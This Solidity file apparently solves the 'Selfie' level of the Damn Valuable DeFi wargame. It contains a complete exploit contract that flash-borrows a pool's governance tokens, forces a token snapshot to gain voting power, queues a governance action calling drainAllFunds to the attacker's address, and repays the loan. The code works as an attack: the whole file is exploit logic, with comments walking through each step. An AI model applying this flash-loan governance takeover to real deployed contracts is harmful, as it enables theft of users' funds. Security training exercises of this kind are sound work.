pragma solidity ^0.6.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
//import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot public token;

    uint256 TOKENS_IN_POOL = 1500000 * 10 * 18;

    address owner;

    uint256 public actionId;


    constructor(address _govAddress, address _poolAddress, address _tokenAddress) public {
        governance = SimpleGovernance(_govAddress);
        pool = SelfiePool(_poolAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress); // this is the governance token
        owner = msg.sender;
    }

    function loan() public {
        // the pool balance is 1.5M while the total token supply is 2M
        //require(token.balanceOf(address(pool)) == 1500000 * 10 ** 18);
        pool.flashLoan(token.balanceOf(address(pool)));

        //pool.flashLoan(1);
    }

    function receiveTokens(address _tokenAddress, uint256 _amount) public {
        // only the pool can call this function
        //require(msg.sender == address(pool));
        // check correctness
        //require(_tokenAddress == address(token));
        //require(token.balanceOf(address(pool)) == _amount);
        require(_amount == 1500000 * 10 ** 18);
        require(token.balanceOf(address(this)) == _amount);

        // now we have plenty of tokens, we can start governing
        // we borrow 1.5M tokens out of 2M total tokens
        // this passes function _hasEnoughVotes
        // our target is drainAllFunds
        // by proposing action
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            );
        actionId = 5;

        // enforcing snapshot on the token contract
        token.snapshot();
        
        actionId = governance.queueAction(address(pool), data, 0);


        // return the borrowed token
        token.transfer(address(pool), _amount);
    }

    function getActionId() public view returns(uint256) {
        return actionId;
    }
}